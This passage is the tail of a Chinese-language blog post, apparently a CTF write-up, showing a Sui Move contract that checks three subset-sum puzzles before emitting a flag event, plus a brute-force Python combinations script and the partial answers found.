+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        assert!(sum <span style="color:#f92672">==</span> k, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun solve_subset1(vec: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span>, status: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Status) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> sum: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> vector::length(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">SUBSET1</span>)) {
+</span></span><span style="display:flex;"><span>            sum <span style="color:#f92672">=</span> sum <span style="color:#f92672">+</span> (<span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>vec, i) <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">SUBSET1</span>, i));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        assert!(<span style="color:#66d9ef">SUBSET1_SUM</span> <span style="color:#f92672">==</span> sum, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        check_params(vec, SUBSET1_k);
+</span></span><span style="display:flex;"><span>        status.status1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun solve_subset2(vec: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span>, status: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Status) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> sum: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> vector::length(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">SUBSET2</span>)) {
+</span></span><span style="display:flex;"><span>            sum <span style="color:#f92672">=</span> sum <span style="color:#f92672">+</span> (<span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>vec, i) <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">SUBSET2</span>, i));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        assert!(<span style="color:#66d9ef">SUBSET2_SUM</span> <span style="color:#f92672">==</span> sum, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        check_params(vec, SUBSET2_k);
+</span></span><span style="display:flex;"><span>        status.status2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun solve_subset3(vec: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span>, status: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Status) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> sum: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> vector::length(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">SUBSET3</span>)) {
+</span></span><span style="display:flex;"><span>            sum <span style="color:#f92672">=</span> sum <span style="color:#f92672">+</span> (<span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>vec, i) <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">SUBSET3</span>, i));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        assert!(<span style="color:#66d9ef">SUBSET3_SUM</span> <span style="color:#f92672">==</span> sum, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        check_params(vec, SUBSET3_k);
+</span></span><span style="display:flex;"><span>        status.status3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun get_flag(status: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">Status</span>, ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> tx_context::TxContext) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> user <span style="color:#f92672">=</span> tx_context::sender(ctx);
+</span></span><span style="display:flex;"><span>        assert!(status.user <span style="color:#f92672">==</span> user, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        assert!(status.status1 <span style="color:#f92672">&amp;&amp;</span> status.status2 <span style="color:#f92672">&amp;&amp;</span> status.status3, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        event::emit(Flag { user: <span style="color:#a6e22e">user</span> });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>从subset中找到一个长度为subset_k的子集，其元素之和等于subset_sum。            <br>
+有三个子问题：solve_subset1，solve_subset2和solve_subset3。         <br>
+请教re大佬后拿到的脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_subset_sum</span>(subset, subset_k, subset_sum):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 导入必要的库</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> combinations
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 遍历subset中所有可能的k元组合</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> combination <span style="color:#f92672">in</span> combinations(subset, subset_k):
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 如果组合的元素之和等于subset_sum，则返回组合</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> sum(combination) <span style="color:#f92672">==</span> subset_sum:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> combination
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 如果找不到满足条件的组合，则返回None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 定义输入</span>
+</span></span><span style="display:flex;"><span>subset <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>]
+</span></span><span style="display:flex;"><span>subset_k <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>subset_sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 调用函数查找满足条件的组合</span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> find_subset_sum(subset, subset_k, subset_sum)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 打印结果</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> result:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;找到满足条件的组合:&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(result)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;找不到满足条件的组合&#34;</span>)
+</span></span></code></pre></div><p>第一组：(1, 4, 5)       <br>
+第二组：(725154659875148, 685173186787942, 1025208692464347, 860527574463312, 882855688862943)      <br>
+第三组跑不出来啦~~~~~~~~~~~</p>
+<h1 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
+<p><a href="https://intro-zh.sui-book.com/">https://intro-zh.sui-book.com/</a>            <br>
+<a href="https://docs.sui.io/concepts/sui-move-concepts">https://docs.sui.io/concepts/sui-move-concepts</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="http://localhost:1313/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
